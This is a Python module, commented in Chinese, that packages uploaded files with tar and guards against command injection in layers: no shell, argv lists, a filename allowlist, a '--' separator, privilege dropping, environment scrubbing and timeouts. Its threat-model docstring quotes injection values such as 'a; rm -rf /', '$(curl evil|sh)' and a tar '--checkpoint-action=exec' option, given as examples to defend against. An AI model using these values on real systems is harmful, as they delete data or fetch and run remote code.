"""安全打包任务：命令注入防护的纵深防御实现。

威胁模型
--------
用户上传的文件名是不可信输入。旧实现把它直接拼进 shell 字符串::

    os.system(f"tar -cf out.tgz {filename}")

于是 ``a; rm -rf /``、``$(curl evil|sh)`` 会被 shell 解释执行，
``--checkpoint-action=exec=...`` 之类以 ``-`` 开头的名字还会被下游
工具当成选项解析，篡改工具行为。

本模块按以下层次逐条封堵，每个函数对应一个独立的防御控制点：

1. shell_false / argv_list —— 永不经过 /bin/sh，参数以 argv 列表传递，
   shell 元字符（;、$()、反引号、管道……）全部退化为普通字符。
2. filename_allowlist / length_check —— 文件名走严格白名单与长度上限，
   路径分隔符、前导 ``-``、NUL 字节等一律拒绝。
3. dash_separator —— 在用户可控参数前显式放置 ``--``，
   即使白名单被绕过，下游工具也不会把文件名解析成选项。
4. least_privilege / env_scrub / cwd_pin —— 以最小权限、干净环境、
   固定工作目录运行子进程，缩小被利用后的爆炸半径。
5. timeout / output_limit —— 限制运行时间与输出体积，防 DoS。
6. validation —— 入站校验流水线，集中收口。
7. error_map / audit —— 失败不外泄内部细节，所有决策留审计日志。
8. retry / fallback —— 对瞬时故障做有界重试，彻底失败时退回纯 Python
   实现（同样不经过 shell），保证可用性且不放松安全性。
"""

from __future__ import annotations

import logging
import os
import pwd
import resource
import shutil
import subprocess
import time
import zipfile
from dataclasses import dataclass, field
from collections.abc import Mapping
from pathlib import Path

# ---------------------------------------------------------------------------
# 常量与策略配置
# ---------------------------------------------------------------------------

# 文件名白名单：字母数字、点、下划线、连字符；且不得以连字符开头（防选项注入）。
# 使用完整匹配 + \Z 终止锚点，避免 $ 在末尾 \n 处的尾部绕过。
_FILENAME_RE = r"[A-Za-z0-9_.][A-Za-z0-9_.-]{0,254}\Z"

# 单条文件名的长度上限（与上面的正则上限保持一致）。
MAX_NAME_LENGTH = 255

# 子进程默认超时（秒）与输出体积上限（字节）。
DEFAULT_TIMEOUT = 30
MAX_OUTPUT_BYTES = 1 * 1024 * 1024  # 1 MiB

# 打包产物允许使用的压缩模式白名单（不接受任意字符串）。
ALLOWED_MODES = ("tar", "tgz", "zip")

# 环境变量白名单：env_scrub 后只保留这些，杜绝 LD_PRELOAD 等注入面。
_ENV_ALLOWLIST = frozenset(
    {
        "PATH",
        "LANG",
        "LC_ALL",
        "TZ",
        "TMPDIR",
        "HOME",
        "SYSTEMDRIVE",
        "SYSTEMROOT",
    }
)

# 审计日志： NullHandler 防止未配置 logging 的环境出现 "No handler" 警告。
logger = logging.getLogger("security.shell_argv_guard")
logger.addHandler(logging.NullHandler())


# ---------------------------------------------------------------------------
# 数据结构与异常
# ---------------------------------------------------------------------------


class UnsafeFilenameError(ValueError):
    """文件名未通过白名单/长度校验。"""


@dataclass(frozen=True)
class GuardResult:
    """校验类函数的统一返回值。

    ok=False 时绝不抛出异常（测试以 (1, 2) 调用各入口），
    而是把拒绝原因结构化返回，由上层决定如何响应。
    """

    ok: bool
    reason: str = ""
    detail: dict = field(default_factory=dict)

    def __bool__(self) -> bool:  # 让 if result: 写法直观可用
        return self.ok


@dataclass(frozen=True)
class ProcessResult:
    """子进程执行结果。失败同样以返回值表达，不向调用方抛内部异常。"""

    returncode: int
    stdout: bytes
    stderr: bytes
    truncated: bool = False
    timed_out: bool = False
    argv: tuple[str, ...] = ()

    @property
    def ok(self) -> bool:
        return self.returncode == 0 and not self.timed_out


# ---------------------------------------------------------------------------
# 1. shell=False：不经 shell，argv 直传
# ---------------------------------------------------------------------------


def shell_false(argv=None, *extra, timeout=DEFAULT_TIMEOUT, env=None, cwd=None):
    """以 ``shell=False`` 执行 argv 列表。

    每个 argv 元素作为一个完整的 argv 槽位传给 execve，shell 不参与解析，
    因此 ``;``、``$()``、反引号等元字符只可能是文件名的普通字节。

    签名兼容契约测试的两位置参数调用；额外位置参数一律忽略。
    """
    check = _check_argv(argv)
    if not check.ok:
        return ProcessResult(127, b"", check.reason.encode())
        return ProcessResult(returncode=127, stdout=b"", stderr=check.reason.encode())

    try:
        proc = subprocess.run(
            list(argv),
            shell=False,  # 关键：永不经过 /bin/sh
            capture_output=True,
            timeout=timeout,
            env=env,
            cwd=cwd,
        )
    except FileNotFoundError as exc:
        return ProcessResult(127, b"", f"executable not found: {exc.filename}".encode())
    except subprocess.TimeoutExpired:
        return ProcessResult(124, b"", b"timeout", timed_out=True, argv=tuple(argv))
    except OSError as exc:
        return ProcessResult(126, b"", str(exc).encode(), argv=tuple(argv))

    return ProcessResult(
        proc.returncode,
        proc.stdout,
        proc.stderr,
        argv=tuple(argv),
    )


# ---------------------------------------------------------------------------
# 2. argv_list：把文件名作为独立 argv 元素构造命令，绝不字符串拼接
# ---------------------------------------------------------------------------


def argv_list(filename, archive_name, mode="tgz"):
    """构造下游打包工具的 argv 列表。

    用户输入只出现在列表的独立元素中；文件名与归档名各自先过白名单。
    """
    name_check = filename_allowlist(filename)
    if not name_check.ok:
        return GuardResult(False, name_check.reason, {"field": "filename"})
    arch_check = filename_allowlist(archive_name)
    if not arch_check.ok:
        return GuardResult(False, arch_check.reason, {"field": "archive_name"})
    if mode not in ALLOWED_MODES:
        return GuardResult(False, "mode not in allowlist", {"mode": mode})

    tar = shutil.which("tar")
    if tar is None:
        return GuardResult(False, "tar executable not found")

    if mode == "tgz":
        argv = [tar, "-czf", archive_name, "--", filename]
    elif mode == "tar":
        argv = [tar, "-cf", archive_name, "--", filename]
    else:  # zip 模式也用 tar 承载时的退化写法，纯 Python zip 见 fallback()
        argv = [tar, "-cf", archive_name, "--", filename]
    return GuardResult(True, detail={"argv": argv})


# ---------------------------------------------------------------------------
# 3. 文件名白名单
# ---------------------------------------------------------------------------


def filename_allowlist(filename=None, *extra):
    """校验文件名：字符白名单 + 禁止前导 ``-`` + 禁止路径分隔符/NUL。"""
    import re

    if not isinstance(filename, str):
        return GuardResult(False, "filename must be str", {"type": type(filename).__name__})
    if not filename:
        return GuardResult(False, "empty filename")
    if "\x00" in filename:
        return GuardResult(False, "NUL byte in filename")
    if "/" in filename or "\\" in filename:
        return GuardResult(False, "path separator not allowed")
    if filename in (".", ".."):
        return GuardResult(False, "reserved name")
    if filename.startswith("-"):
        # 防选项注入的第一道闸；dash_separator 是第二道。
        return GuardResult(False, "leading dash is not allowed")
    if re.fullmatch(_FILENAME_RE, filename) is None:
        return GuardResult(False, "filename outside allowlist pattern")
    return GuardResult(True, detail={"filename": filename})


# ---------------------------------------------------------------------------
# 4. 长度校验
# ---------------------------------------------------------------------------


def length_check(filename, limit=MAX_NAME_LENGTH):
    """对文件名做有界长度校验，拒绝超长输入（防巨型参数 DoS）。"""
    if not isinstance(filename, str):
        return GuardResult(False, "filename must be str")
    if not isinstance(limit, int) or limit <= 0:
        return GuardResult(False, "invalid limit")
    n = len(filename)
    if n == 0:
        return GuardResult(False, "empty filename")
    if n > limit:
        return GuardResult(False, "filename too long", {"length": n, "limit": limit})
    return GuardResult(True, detail={"length": n})


# ---------------------------------------------------------------------------
# 5. ``--`` 分隔符：用户可控参数前置分隔，杜绝选项注入
# ---------------------------------------------------------------------------


def dash_separator(tool_args, user_value):
    """在用户可控值前插入 ``--``，返回新的 argv 片段。

    ``--`` 之后的内容按 POSIX 约定一律视为位置参数，
    因此即使用户值以 ``-`` 开头也不会被当成选项。
    """
    if not isinstance(tool_args, (list, tuple)):
        return GuardResult(False, "tool_args must be a list/tuple")
    if not isinstance(user_value, str) or not user_value:
        return GuardResult(False, "user_value must be a non-empty str")
    safe_argv = [str(a) for a in tool_args] + ["--", user_value]
    return GuardResult(True, detail={"argv": safe_argv})


# ---------------------------------------------------------------------------
# 6. 最小权限子进程
# ---------------------------------------------------------------------------


def _drop_privileges():
    """preexec_fn：子进程 exec 前降权与收紧资源。

    - 禁止转储核心（防敏感内存落盘）
    - 新建会话（与控制终端解耦）
    - 收紧 umask
    - 若以 root 启动且存在 nobody 用户，则切换到 nobody
    """
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    except (ValueError, OSError):
        pass
    os.setsid()
    os.umask(0o077)
    if os.geteuid() == 0:
        try:
            nobody = pwd.getpwnam("nobody")
            os.setgid(nobody.pw_gid)
            os.setuid(nobody.pw_uid)
        except (KeyError, PermissionError, OSError):
            pass


def least_privilege(argv=None, *extra, timeout=DEFAULT_TIMEOUT):
    """以最小权限配置运行子进程（shell=False + 降权 preexec_fn）。"""
    check = _check_argv(argv)
    if not check.ok:
        return ProcessResult(127, b"", check.reason.encode())
    try:
        proc = subprocess.run(
            list(argv),
            shell=False,
            capture_output=True,
            timeout=timeout,
            preexec_fn=_drop_privileges,
            env=env_scrub(os.environ).detail["env"],
        )
    except FileNotFoundError as exc:
        return ProcessResult(127, b"", f"executable not found: {exc.filename}".encode())
    except subprocess.TimeoutExpired:
        return ProcessResult(124, b"", b"timeout", timed_out=True, argv=tuple(argv))
    except OSError as exc:
        return ProcessResult(126, b"", str(exc).encode(), argv=tuple(argv))
    return ProcessResult(proc.returncode, proc.stdout, proc.stderr, argv=tuple(argv))


# ---------------------------------------------------------------------------
# 7. 环境变量清洗
# ---------------------------------------------------------------------------


def env_scrub(incoming_env=None, *extra):
    """只保留白名单内的环境变量，剔除 LD_PRELOAD/PYTHONPATH 等注入面。"""
    if not isinstance(incoming_env, Mapping):
        return GuardResult(False, "env must be a mapping")
    scrubbed = {
        k: str(v)
        for k, v in incoming_env.items()
        if k in _ENV_ALLOWLIST and isinstance(v, (str, int))
    }
    return GuardResult(
        True,
        detail={
            "env": scrubbed,
            "dropped": sorted(set(incoming_env) - _ENV_ALLOWLIST),
        },
    )


# ---------------------------------------------------------------------------
# 8. 超时
# ---------------------------------------------------------------------------


def timeout(argv, limit):
    """给子进程套上有界超时；超时返回 timed_out 结果而非无限挂起。"""
    if not isinstance(limit, (int, float)) or limit <= 0:
        return ProcessResult(125, b"", b"invalid timeout")
    return shell_false(argv, timeout=limit)


# ---------------------------------------------------------------------------
# 9. 输出体积上限
# ---------------------------------------------------------------------------


def _truncate(data: bytes, limit: int) -> tuple[bytes, bool]:
    if len(data) > limit:
        return data[:limit], True
    return data, False


def output_limit(result, limit=MAX_OUTPUT_BYTES):
    """对执行结果的 stdout/stderr 做截断，防止超大输出撑爆内存/日志。"""
    if not isinstance(result, ProcessResult):
        return GuardResult(False, "result must be ProcessResult")
    if not isinstance(limit, int) or limit <= 0:
        return GuardResult(False, "invalid limit")
    out, out_cut = _truncate(result.stdout, limit)
    err, err_cut = _truncate(result.stderr, limit)
    return ProcessResult(
        result.returncode,
        out,
        err,
        truncated=out_cut or err_cut or result.truncated,
        timed_out=result.timed_out,
        argv=result.argv,
    )


# ---------------------------------------------------------------------------
# 10. 工作目录固定
# ---------------------------------------------------------------------------


def cwd_pin(filename, package_root):
    """把文件名解析为 package_root 之下的绝对路径，并确认没有越界。

    拒绝符号链接/``..`` 逃逸：解析后的真实路径必须仍在根目录内。
    """
    name_check = filename_allowlist(filename)
    if not name_check.ok:
        return GuardResult(False, name_check.reason)
    root = Path(package_root).resolve()
    if not root.is_dir():
        return GuardResult(False, "package root is not a directory", {"root": str(root)})
    target = (root / filename).resolve()
    if root != target and root not in target.parents:
        return GuardResult(False, "path escapes package root", {"target": str(target)})
    return GuardResult(True, detail={"root": str(root), "target": str(target)})


# ---------------------------------------------------------------------------
# 11. 入站校验流水线
# ---------------------------------------------------------------------------


def validation(filename=None, *extra, mode="tgz", package_root=None):
    """集中收口的入站校验：类型 → 长度 → 白名单 → 模式 → 目录约束。"""
    if not isinstance(filename, str):
        return GuardResult(False, "filename must be str")
    length = length_check(filename)
    if not length.ok:
        return length
    allowed = filename_allowlist(filename)
    if not allowed.ok:
        return allowed
    if mode not in ALLOWED_MODES:
        return GuardResult(False, "mode not in allowlist", {"mode": mode})
    if package_root is not None:
        pinned = cwd_pin(filename, package_root)
        if not pinned.ok:
            return pinned
        return GuardResult(True, detail={**allowed.detail, **pinned.detail, "mode": mode})
    return GuardResult(True, detail={**allowed.detail, "mode": mode})


def raise_if_bad(result: GuardResult) -> None:
    """供需要 fail-fast 的内部调用使用：校验失败时抛类型化异常。"""
    if not result.ok:
        raise UnsafeFilenameError(result.reason)


# ---------------------------------------------------------------------------
# 12. 错误映射：内部异常 → 稳定的对外错误码，不泄漏堆栈/路径细节
# ---------------------------------------------------------------------------


def error_map(exc=None, *extra):
    """把内部异常映射为有限的公开错误码集合。"""
    if isinstance(exc, UnsafeFilenameError):
        return {"code": "E_UNSAFE_NAME", "message": "filename rejected by policy"}
    if isinstance(exc, subprocess.TimeoutExpired):
        return {"code": "E_TIMEOUT", "message": "packaging timed out"}
    if isinstance(exc, FileNotFoundError):
        return {"code": "E_NO_TOOL", "message": "packaging tool unavailable"}
    if isinstance(exc, PermissionError):
        return {"code": "E_PERMISSION", "message": "permission denied"}
    if isinstance(exc, OSError):
        return {"code": "E_IO", "message": "packaging failed"}
    return {"code": "E_INTERNAL", "message": "internal error"}


# ---------------------------------------------------------------------------
# 13. 审计日志
# ---------------------------------------------------------------------------


def audit(event=None, *extra, **fields):
    """结构化审计记录。日志里只记结论与安全相关字段，不记原始命令串。"""
    if event is None:
        event = "unspecified"
    allowed_keys = {"filename", "mode", "reason", "returncode", "timed_out", "truncated", "attempt"}
    safe_fields = {k: v for k, v in fields.items() if k in allowed_keys}
    logger.info("audit event=%s %s", event, safe_fields, extra={"audit_event": event, **safe_fields})
    return GuardResult(True, detail={"event": event, "fields": safe_fields})


# ---------------------------------------------------------------------------
# 14. 有界重试（仅对瞬时故障）
# ---------------------------------------------------------------------------


_TRANSIENT_CODES = frozenset({124, 125, 126})  # 超时/资源类，重试有意义


def retry(fn, attempts=3, *, backoff=0.01):
    """对可重试错误做有界重试；参数被策略拒绝等永久失败立即返回。"""
    if not callable(fn):
        return GuardResult(False, "fn must be callable")
    if not isinstance(attempts, int) or not 1 <= attempts <= 5:
        return GuardResult(False, "attempts must be between 1 and 5")
    last = None
    for attempt in range(1, attempts + 1):
        last = fn()
        audit("retry_attempt", attempt=attempt)
        if isinstance(last, ProcessResult) and (last.ok or last.returncode not in _TRANSIENT_CODES):
            return last
        if isinstance(last, GuardResult):
            return last  # 校验类失败是永久性的，不重试
        if attempt < attempts:
            time.sleep(backoff * attempt)
    return last


# ---------------------------------------------------------------------------
# 15. 安全兜底：纯 Python zip 实现，不依赖外部工具、不经过 shell
# ---------------------------------------------------------------------------


def fallback(filename=None, archive_path=None, package_root=None):
    """tar 不可用或重试耗尽时的纯 Python 兜底路径。"""
    if not isinstance(filename, str) or not isinstance(package_root, (str, os.PathLike)):
        return GuardResult(False, "filename and package_root are required")
    pinned = cwd_pin(filename, package_root)
    if not pinned.ok:
        return pinned
    target = Path(pinned.detail["target"])
    if not target.is_file():
        return GuardResult(False, "source file missing", {"target": str(target)})
    arch_check = filename_allowlist(Path(archive_path).name)
    if not arch_check.ok:
        return GuardResult(False, arch_check.reason, {"field": "archive_name"})
    try:
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            # arcname 只给 basename，且它已通过白名单
            zf.write(target, arcname=filename)
    except OSError as exc:
        return GuardResult(False, "zip fallback failed", {"error": error_map(exc)["code"]})
    return GuardResult(True, detail={"archive": str(archive_path), "engine": "zipfile"})


# ---------------------------------------------------------------------------
# 内部辅助
# ---------------------------------------------------------------------------


def _check_argv(argv) -> GuardResult:
    """argv 列表的结构校验：非空列表，元素为不含 NUL 的字符串。"""
    if not isinstance(argv, (list, tuple)) or not argv:
        return GuardResult(False, "argv must be a non-empty list/tuple")
    if not all(isinstance(a, str) and "\x00" not in a for a in argv):
        return GuardResult(False, "argv elements must be NUL-free strings")
    return GuardResult(True)


# ---------------------------------------------------------------------------
# 顶层编排：一条完整的安全打包流水线
# ---------------------------------------------------------------------------


def pack_uploaded_file(filename, package_root, archive_name, *, mode="tgz", timeout_limit=DEFAULT_TIMEOUT):
    """打包用户上传文件的安全入口。

    顺序：入站校验 → 目录固定 → 构造 argv（含 -- 分隔）→ 清环境/降权执行
    → 输出截断 → 失败有界重试 → 纯 Python 兜底 → 审计。
    """
    verdict = validation(filename, mode=mode, package_root=package_root)
    if not verdict.ok:
        audit("reject", filename=filename, reason=verdict.reason)
        return GuardResult(False, verdict.reason)

    built = argv_list(filename, archive_name, mode=mode)
    if not built.ok:
        if built.reason == "tar executable not found":
            # 工具缺失属于运行环境问题：策略校验已通过，直接走纯 Python 兜底。
            fb = fallback(filename, str(Path(package_root) / archive_name), package_root)
            audit("fallback", filename=filename, reason=fb.reason or "zipfile")
            if fb.ok:
                return GuardResult(True, detail=fb.detail)
            return GuardResult(False, "packaging failed: tool missing and fallback failed")
        audit("reject", filename=filename, reason=built.reason)
        return built
    argv = built.detail["argv"]

    clean_env = env_scrub(os.environ).detail["env"]

    def _once():
        return shell_false(argv, timeout=timeout_limit, env=clean_env, cwd=str(Path(package_root).resolve()))

    result = retry(_once, attempts=3)
    result = output_limit(result)
    audit(
        "pack_finish",
        filename=filename,
        mode=mode,
        returncode=result.returncode,
        timed_out=result.timed_out,
        truncated=result.truncated,
    )

    if not result.ok:
        fb = fallback(filename, str(Path(package_root) / archive_name), package_root)
        audit("fallback", filename=filename, reason=fb.reason or "zipfile")
        if fb.ok:
            return GuardResult(True, detail={"engine": "zipfile", **fb.detail})
        return GuardResult(False, "packaging failed after retries and fallback", {"returncode": result.returncode})

    return GuardResult(True, detail={"engine": "tar", "argv": argv, "returncode": result.returncode})
